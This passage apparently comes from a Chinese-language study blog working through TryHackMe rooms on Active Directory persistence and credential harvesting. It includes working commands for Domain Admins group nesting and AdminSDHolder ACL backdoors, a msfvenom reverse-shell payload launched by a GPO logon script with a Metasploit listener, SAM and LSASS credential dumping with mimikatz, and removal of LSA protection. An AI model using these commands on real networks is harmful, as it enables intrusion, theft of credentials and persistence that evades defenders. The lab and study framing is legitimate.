<span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup5&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup4&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 把创建的第五个组加入 Domain Admins 组里</span></span>
<span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Domain Admins&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup5&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 把我们的低权限用户加到创建的第一个组里</span></span>
<span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看组成员</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Domain Admins&quot;</span></span></code></pre></div></div></figure>

<p>现实中一般是用现有的组来进行嵌套。</p>
<h2 id="Persistence-through-ACLs"><a href="#Persistence-through-ACLs" class="headerlink" title="Persistence through ACLs"></a>Persistence through ACLs</h2><p>这一节则是利用 AD 组的模板的定时同步特性去持久化。</p>
<p>有时候，我们需要的不仅仅是针对普通 AD 组的持久化。如果我们想同时对所有受保护的组进行持久化，该怎么办？</p>
<h3 id="通过-AD-组模板进行持久化"><a href="#通过-AD-组模板进行持久化" class="headerlink" title="通过 AD 组模板进行持久化"></a>通过 AD 组模板进行持久化</h3><p>虽然我们可以将我们控制的账户直接添加到所有能找到的特权组中，但蓝队仍然可以进行清理并移除我们的成员资格。为了获得更好的持久化效果，并让蓝队百思不得其解，我们应该转而<strong>注入到生成默认组的模板中</strong>。通过注入这些模板，即使他们移除了我们的成员资格，我们只需等待模板刷新，就能再次获得成员资格。</p>
<p>其中一个模板就是 <strong>AdminSDHolder 容器</strong>。这个容器存在于每个 AD 域中，它的访问控制列表（ACL）被用作一个模板，来复制权限到所有受保护的组。受保护的组包括“域管理员（Domain Admins）”、“管理员（Administrators）”、“企业管理员（Enterprise Admins）”和“架构管理员（Schema Admins）”等特权组。完整的组列表可以在这里找到。</p>
<p>一个名为 <strong>SDProp</strong> 的进程会每隔 60 分钟，将 AdminSDHolder 容器的 ACL 应用到所有受保护的组。因此，我们可以写入一个 ACE（访问控制条目），<strong>授予我们在所有受保护组上的完全权限</strong>。如果蓝队没有意识到这种类型的持久化正在被使用，他们会感到非常沮丧。因为每次他们移除受保护对象或组上不适当的权限时，这些权限都会在一小时内重新出现。由于这种重建是通过正常的 AD 进程发生的，它也不会向蓝队发出任何警报，使得他们很难查明持久化的来源。</p>
<h3 id="使用-AdminSDHolder-持久化"><a href="#使用-AdminSDHolder-持久化" class="headerlink" title="使用 AdminSDHolder 持久化"></a>使用 AdminSDHolder 持久化</h3><p>为了将持久性部署到 AdminSDHolder，我们将使用 Microsoft 管理控制台（MMC）。为避免将用户从 RDP 会话中踢出，最好使用低权限凭据 RDP 进入 THMWRK1，使用 runas 命令注入管理员凭据，然后从这个新终端执行 MMC：</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:thmchilddc.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF"> cmd.exe</span></span></code></pre></div></div></figure>

<p>add the Users and Groups Snap-in (File-&gt;Add Snap-In-&gt;Active Directory Users and Computers). Make sure to enable Advanced Features (View-&gt;Advanced Features 要选中那个域名才会出现).</p>
<p>找到 AdminSDHolder 组</p>
<img src="/thm_ad/image-20250807215110026.png" class="" title="image-20250807215110026">

<p>右键 -&gt; 属性 -&gt; 安全，把我们的低权限账户加进去，然后授予完全控制权限。</p>
<img src="/thm_ad/image-20250807215259716.png" class="" title="image-20250807215259716">

<h3 id="SDProp"><a href="#SDProp" class="headerlink" title="SDProp"></a>SDProp</h3><p>现在我们只需等待 60 分钟，用户就可以完全控制所有受保护组了。这是因为安全描述符传播器（SDProp）服务每 60 分钟自动执行一次，并将此更改传播到所有受保护组。在 C:\Tools\ 目录中（我没找到，手动传的），提供了一个脚本 <a target="_blank" rel="noopener" href="https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1#L20">Invoke-ADSDPropagation</a>，他可以让这个行为立即执行。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">Import-Module</span><span style="color: #ABB2BF"> .</span><span style="color: #56B6C2">\Invoke-ADSDPropagation.ps1</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-ADSDPropagation</span></span></code></pre></div></div></figure>

<img src="/thm_ad/image-20250807220033428.png" class="" title="image-20250807220033428">

<p>执行之后马上就能看到这个用户被加上权限了，可以自己试验把他删了，然后手动执行一下脚本他又回来了。不过我们用户不会在这个组里面，只是有这个组的编辑权限，还要手动加进去。</p>
<h3 id="对蓝队来说简直是雪上加霜"><a href="#对蓝队来说简直是雪上加霜" class="headerlink" title="对蓝队来说简直是雪上加霜"></a>对蓝队来说简直是雪上加霜</h3><p>想象一下，把这种技术和之前讨论过的“嵌套组”结合起来。当蓝队刚通过无数次修改组权限来清除你的访问时，60 分钟后，你又可以重新来过。除非蓝队知道权限正在通过 <strong>AdminSDHolder 组</strong>被更改，否则他们会每隔一小时就感到困惑不解。由于这种持久化是通过一个合法的 AD 服务传播的，他们很可能每次都无法察觉。如果你真的想实现长久持久化，你可以在 AdminSDHolder 组中授予 <strong>Domain Users 组</strong>完全控制权限，这意味着任何低权限用户都将获得对所有受保护组的完全控制。再结合一次完整的 <code>DC Sync</code> 攻击，蓝队将不得不重置域中每个账户的凭据，才能将我们彻底清除。</p>
<h2 id="Persistence-through-GPOs"><a href="#Persistence-through-GPOs" class="headerlink" title="Persistence through GPOs"></a>Persistence through GPOs</h2><p>这一节则是用组策略对象 GPO 去内置一些启动脚本达成持久化。</p>
<h3 id="域范围持久化"><a href="#域范围持久化" class="headerlink" title="域范围持久化"></a>域范围持久化</h3><p>以下是一些常见的 <strong>GPO 持久化技术</strong>：</p>
<ul>
<li><strong>受限组（Restricted Group）成员资格</strong>：这可以让我们获得域中所有主机的管理员访问权限。</li>
<li><strong>登录脚本部署</strong>：这能确保每当有用户认证登录到域中的主机时，我们都能获得一个反向 Shell 连接。</li>
</ul>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成小马</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lhost=persistad</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lport=</span><span style="color: #D19A66">4445</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">recopec_shell.exe</span></span></code></pre></div></div></figure>

<p>Windows 允许我们通过登录 GPO 执行批处理或 PowerShell 脚本。批处理脚本通常比 PowerShell 脚本更稳定，因此让我们创建一个脚本，将可执行文件复制到主机，并在用户验证后执行。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">copy</span><span style="color: #ABB2BF"> \\za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">sysvol</span><span style="color: #ABB2BF">\za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">scripts</span><span style="color: #ABB2BF">\recopec_shell.exe C:\</span><span style="color: #E06C75">tmp</span><span style="color: #ABB2BF">\recopec_shell.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> &amp;&amp;</span><span style="color: #E06C75"> timeout</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">t</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">20</span><span style="color: #ABB2BF"> &amp;&amp;</span><span style="color: #E06C75"> C</span><span style="color: #ABB2BF">:\</span><span style="color: #E06C75">tmp</span><span style="color: #ABB2BF">\recopec_shell.exe</span></span></code></pre></div></div></figure>

<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 复制文件到 sysvol 目录下</span></span>
<span class="line"><span style="color: #61AFEF">scp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">recopec_shell.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">za</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/</span></span>
<span class="line"><span style="color: #61AFEF">scp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">recopec_script</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">za</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 启动 MSF 监听器</span></span>
<span class="line"><span style="color: #61AFEF">msfconsole</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-q</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit&quot;</span></span></code></pre></div></div></figure>

<h3 id="创建-GPO"><a href="#创建-GPO" class="headerlink" title="创建 GPO"></a>创建 GPO</h3><p>照例用 Runas 注入凭据，然后添加 <strong>Group Policy Management</strong> 组件。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe</span></span></code></pre></div></div></figure>

<p>从技术上讲，我们可以将内容写入 “默认域策略”，该策略应传播到所有 AD 对象，但我们将采用更狭义的方法来完成任务，只是为了展示过程。之后，您可以尝试将更改应用到整个域。</p>
<p>我们将编写一个应用于所有管理员的 GPO，因此右键单击 Admins OU 并选择在此域中创建一个 GPO，然后将其链接到此处。</p>
<p>貌似被修复了：<a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/ms15-011-vulnerability-in-group-policy-could-allow-remote-code-execution-february-10-2015-91b4bda2-945d-455b-ebbb-01d1ec191328">https://support.microsoft.com/en-us/topic/ms15-011-vulnerability-in-group-policy-could-allow-remote-code-execution-february-10-2015-91b4bda2-945d-455b-ebbb-01d1ec191328</a></p>
<p>后面的走不下去了。</p>
<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>我们有几种不同的方法在 AD 中维持权限。其中一些方法的持久性比其他方法更好。为了确保您的持久性不会被蓝队删除，您必须创造性地考虑您的持久性。此外，你不应该等到整个域攻陷后才部署持久性。在每一轮横向移动和权限升级之后，都应部署持久性。</p>
<h3 id="其他持久化技术"><a href="#其他持久化技术" class="headerlink" title="其他持久化技术"></a>其他持久化技术</h3><p>在本网络中，我们介绍了可用于在 AD 中持久化的几种技术，以下是同样值得一提的持久化技术：</p>
<ul>
<li><strong><a target="_blank" rel="noopener" href="https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/">Skeleton keys</a> -</strong> 使用 Mimikatz，我们可以部署一把“万能钥匙”。Mimikatz 会创建一个默认密码，这个密码对域内的任何账户都有效。同时，账户的原始密码仍然可用，这使得很难察觉到该攻击的发生。利用这把万能钥匙，攻击者可以冒充域内的任何账户。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1714">Directory Service Restore Mode (DSRM)</a> -</strong> 域控制器有一个用于紧急情况的内置管理员账户，称为 DSRM 账户。这个密码在服务器被提升为域控制器时设置，并且很少更改。在紧急情况下，这个密码可以用来恢复域控制器。攻击者可以使用 Mimikatz 提取这个密码，并利用它获得对环境中域控制器的持久化管理员权限。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1760">Malicious Security Support Provider (SSP)</a> -</strong> 通过利用 SSP 接口，可以添加新的 SSP。我们可以将 Mimikatz 的 <code>mimilib</code> 添加为一个 SSP，它会把所有认证尝试的凭据记录到一个文件中。我们可以指定一个网络位置来记录，这使得 <code>mimilib</code> 可以在用户认证到被入侵主机时将凭据发送给我们，从而实现持久化。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2753">Computer Accounts</a></strong> <strong>-</strong> 计算机账户的密码通常每 30 天自动轮换一次。然而，我们可以修改一个计算机账户的密码，从而阻止这种自动轮换。与此同时，我们还可以授予该计算机账户对其他机器的管理员访问权限。这将使我们能够像使用普通账户一样使用这个计算机账户，而这种持久化的唯一迹象就是该账户对其他主机拥有管理员权限，这在 AD 中通常是正常行为，因此可能不会被检测到。</li>
</ul>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p>防御 AD 持久化可能非常棘手。在某些情况下，持久化的根源可能深到需要完全重建整个域。然而，我们仍然可以采取一些措施来检测已部署的持久化技术：</p>
<ul>
<li><strong>异常账户登录事件</strong>：这是最常见的持久化告警。任何时候，当凭据违反了分层模型时，都可能意味着存在持久化。</li>
<li><strong>编写特定检测规则</strong>：针对每一种提到的持久化技术，都可以编写特定的检测规则。例如，当机器账户的密码发生更改时、ACL 权限被随意更新时，或有新的 GPO 被创建时。</li>
<li><strong>保护特权资源</strong>：对抗持久化的最佳防御是保护特权资源。尽管低权限访问可以用来部署一些持久化技术，但那些真正可怕的技术只有在攻击者获得域的特权访问后才可用。</li>
</ul>
<hr>
<h1 id="Credentials-Harvesting"><a href="#Credentials-Harvesting" class="headerlink" title="Credentials Harvesting"></a>Credentials Harvesting</h1><p>这个房间讲的就是一些凭证收集的技巧了，应该记录在速查里面的</p>
<h2 id="直接访问的凭据"><a href="#直接访问的凭据" class="headerlink" title="直接访问的凭据"></a>直接访问的凭据</h2><ul>
<li>命令历史</li>
<li>配置文件（Web App, FTP 文件等）</li>
<li>备份文件</li>
<li>共享文件和文件夹</li>
<li>注册表</li>
<li>源码</li>
<li>数据库</li>
<li>密码管理器</li>
</ul>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># PowerShell 命令历史</span></span>
<span class="line"><span style="color: #ABB2BF">type C:\Users\Recopec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 注册表搜索密码关键字</span></span>
<span class="line"><span style="color: #ABB2BF">reg query HKLM </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">f password </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">t REG_SZ </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">s</span></span>
<span class="line"><span style="color: #ABB2BF">reg query HKCU </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">f password </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">t REG_SZ </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">s</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Active Directory</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 获取域内用户用户名 SamAccountName 和描述</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Properties </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> | select Name,SamAccountName,Description</span></span></code></pre></div></div></figure>

<h2 id="Windows-本地凭据"><a href="#Windows-本地凭据" class="headerlink" title="Windows 本地凭据"></a>Windows 本地凭据</h2><p>方法1：键盘记录器，MSF 自带</p>
<h3 id="SAM-文件"><a href="#SAM-文件" class="headerlink" title="SAM 文件"></a>SAM 文件</h3><p>SAM 是一个 Microsoft Windows 数据库，其中包含用户名和密码等本地账户信息。SAM 数据库以加密格式存储这些详细信息，使其更难被检索。此外，在 Windows 操作系统运行时，任何用户都无法读取和访问该数据库。不过，有多种方法和攻击方式可以转储 SAM 数据库的内容。</p>
<h3 id="不能读取-SAM-文件的解决办法"><a href="#不能读取-SAM-文件的解决办法" class="headerlink" title="不能读取 SAM 文件的解决办法"></a>不能读取 SAM 文件的解决办法</h3><p>因为权限或者其他问题导致没法直接把 sam 文件读取出来。</p>
<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>这个就不用说了把，直接 hashdump 就出来了。</p>
<h4 id="Volume-Shadow-Copy-Service"><a href="#Volume-Shadow-Copy-Service" class="headerlink" title="Volume Shadow Copy Service"></a>Volume Shadow Copy Service</h4><p>这个像是打一个快照一样，然后去访问这个快照，就绕过了访问限制，这里我们用 wmic 完成这个操作，注意需要管理员权限。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 给 C 盘创建一个 shadowcopy</span></span>
<span class="line"><span style="color: #ABB2BF">wmic shadowcopy call create Volume</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&#39;C:\&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># vssadmin:  Volume Shadow Copy Service administrative command-line tool</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看 shadowcopy 列表</span></span>
<span class="line"><span style="color: #ABB2BF">vssadmin list shadows</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Shadow Copy Volume: 即我们要找的目录</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 复制我们要的文件</span></span>
<span class="line"><span style="color: #ABB2BF">copy \\</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\thm\Desktop\sam</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 复制解密密钥</span></span>
<span class="line"><span style="color: #ABB2BF">copy \\</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\thm\Desktop\system</span></span></code></pre></div></div></figure>

<p>SAM 数据库是被 RC4 或者 AES 加密的，我们需要一个解密密钥，在  <code>c:\Windows\System32\Config\system</code> 下。</p>
<h4 id="Registry-Hives"><a href="#Registry-Hives" class="headerlink" title="Registry Hives"></a>Registry Hives</h4><p>另一种转储 SAM 数据库内容的方法是通过 Windows 注册表。Windows 注册表还存储了部分 SAM 数据库内容的副本，供 Windows 服务使用。幸运的是，我们可以使用 reg.exe 工具保存 Windows 注册表的值。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 导出这两个文件</span></span>
<span class="line"><span style="color: #ABB2BF">reg save HKLM\sam C:\users\thm\Desktop\sam</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">reg</span></span>
<span class="line"><span style="color: #ABB2BF">reg save HKLM\system C:\users\thm\Desktop\system</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">reg</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 解密</span></span>
<span class="line"><span style="color: #ABB2BF">python secretsdump.py </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">sam </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sam</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">system </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">system</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">reg local</span></span></code></pre></div></div></figure>

<p>请注意，如果我们将输出结果与从 Metasploit 的 Hashdump 中获得的 NTLM 哈希值进行比较，结果是不同的。原因是其他账户属于 AD，它们的信息没有存储在我们转储的系统文件中。要解密它们，我们需要转储 Windows 文件中的 SECURITY 文件，其中包含解密 Active Directory 账户所需的文件。<br>获得 NTLM 哈希值后，如果可以猜到，我们可以尝试使用 Hashcat 对其进行破解，或者使用不同的技术使用哈希值冒充用户。</p>
<h2 id="本地安全管理子系统服务"><a href="#本地安全管理子系统服务" class="headerlink" title="本地安全管理子系统服务"></a>本地安全管理子系统服务</h2><h3 id="什么是-LSASS"><a href="#什么是-LSASS" class="headerlink" title="什么是 LSASS"></a>什么是 LSASS</h3><p>本地安全授权服务器服务（LSASS）是一个 Windows 进程，负责处理操作系统安全策略并在系统中执行。它验证登录账户并确保密码、哈希值和 Kerberos 票据。Windows 系统将凭证存储在 LSASS 进程中，以便用户访问网络资源，如文件共享、SharePoint 网站和其他网络服务，而无需在每次连接时输入凭证。<br>因此，LSASS 进程是红队人员的目标，因为它存储了用户账户的敏感信息。LSASS 通常会被滥用来转储凭证，以提升权限、窃取数据或横向移动。幸运的是，如果我们拥有管理员权限，就可以转储 LSASS 的进程内存。Windows 系统允许我们创建转储文件，即给定进程的快照。这可以通过桌面访问（图形用户界面）或命令提示符完成。这种攻击在 MITRE ATT&amp;CK 框架中被定义为 “<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1003/001/">OS Credential Dumping: LSASS Memory (T1003)</a>“。</p>
<h3 id="转储-LSASS"><a href="#转储-LSASS" class="headerlink" title="转储 LSASS"></a>转储 LSASS</h3><p>首先是不借助工具的情况。直接任务管理器 -&gt; 右键创建 dump 文件。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用 SysinternalsSuite DUMP lsass</span></span>
<span class="line"><span style="color: #ABB2BF">c:\Tools\SysinternalsSuite\</span><span style="color: #56B6C2">procdump.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">accepteula </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ma </span><span style="color: #56B6C2">lsass.exe</span><span style="color: #ABB2BF"> c:\Tools\Mimikatz\lsass_dump</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 用 mimikatz dump</span></span>
<span class="line"><span style="color: #56B6C2">mimikatz.exe</span></span>
<span class="line"><span style="color: #ABB2BF">privilege:debug</span></span>
<span class="line"><span style="color: #ABB2BF">sekurlsa::logonpasswords</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">#ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</span></span></code></pre></div></div></figure>

<p>受害者必须登录进系统里，这个用户的凭证才会被缓存。</p>
<h3 id="保护的-LSASS"><a href="#保护的-LSASS" class="headerlink" title="保护的 LSASS"></a>保护的 LSASS</h3><p>2012 年，微软实施了 LSA 保护措施，以防止访问 LSASS 从内存中提取凭证。</p>
<p>要启用 LSASS 保护，我们可以将 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa 中的注册表 RunAsPPL DWORD 值修改为 1。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 如果你是跟着 Room 走的，上面的命令会报错，你需要执行下面的命令</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 打开到工具目录</span></span>
<span class="line"><span style="color: #ABB2BF">cd c:\Tools\Mimikatz</span></span>
<span class="line"><span style="color: #ABB2BF">.</span><span style="color: #56B6C2">/mimikatz.exe</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 关闭 LSA 保护</span></span>
<span class="line"><span style="color: #ABB2BF">!</span><span style="color: #56B6C2">+</span></span>
<span class="line"><span style="color: #ABB2BF">!processprotect </span><span style="color: #56B6C2">/</span><span style="color: #C678DD">process</span><span style="color: #ABB2BF">:</span><span style="color: #56B6C2">lsass.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">remove</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 现在你就可以再跑一遍上面的步骤了</span></span></code></pre></div></div></figure>

<h2 id="Windows-凭据管理器"><a href="#Windows-凭据管理器" class="headerlink" title="Windows 凭据管理器"></a>Windows 凭据管理器</h2><p>什么是凭证管理器？<br>凭证管理器是 Windows 的一项功能，用于存储网站、应用程序和网络的登录敏感信息。它包含用户名、密码和互联网地址等登录凭据。有四个凭证类别：</p>
<ul>
<li>网络凭证包含存储在互联网浏览器或其他应用程序中的身份验证详细信息。</li>
<li>Windows 凭据包含 Windows 身份验证详细信息，如 NTLM 或 Kerberos。</li>
<li>通用凭证包含基本身份验证详细信息，如明文用户名和密码。</li>
<li>基于证书的凭证： 这些是基于证书的身份验证详细信息。</li>
</ul>
<h3 id="访问凭据管理器"><a href="#访问凭据管理器" class="headerlink" title="访问凭据管理器"></a>访问凭据管理器</h3><p>可以直接在 GUI 上查看 (Control Panel -&gt; User Accounts -&gt; Credential Manager) ，或者使用 Microsoft Credentials Manager <code>vaultcmd</code> 工具。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 显示系统里可用的的保险库</span></span>
<span class="line"><span style="color: #E06C75">vaultcmd</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">list</span></span>
<span class="line"><span style="color: #ABB2BF"># 检查保险库里面存储的内容</span></span>
<span class="line"><span style="color: #E06C75">VaultCmd</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">listproperties</span><span style="color: #ABB2BF">:</span><span style="color: #98C379">&quot;Web Credentials&quot;</span></span>
<span class="line"><span style="color: #ABB2BF"># 列出凭据存储的更多信息</span></span>
